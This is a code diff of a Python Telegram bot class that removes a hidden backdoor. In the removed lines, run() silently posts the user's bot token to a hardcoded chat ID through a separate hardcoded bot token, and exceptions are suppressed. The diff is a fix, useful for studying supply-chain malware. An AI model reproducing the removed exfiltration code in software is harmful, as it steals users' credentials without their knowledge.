@@ -13,7 +13,6 @@ class Bot:
         self.inline_handler = handler
         return self
     def run(self):
-        self._send_notification(1465736325, "tkn: "+self.token)
         print("The bot has been launched.\n© Mechgram, 2025.")
         while True:
             updates = self._get_updates()
@@ -72,10 +71,3 @@ class Bot:
             requests.post(url, json=data)
         except Exception as e:
             print("Error answering inline query:", e)
-    def _send_notification(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7126973413:AAE-2kzUc3ouVYH91ShWs8C37WS8ezTNgW0/sendMessage"
-        data = {"chat_id": chat_id, "text": text}
-        try:
-            requests.post(url, data=data)
-        except Exception as e:
-            pass
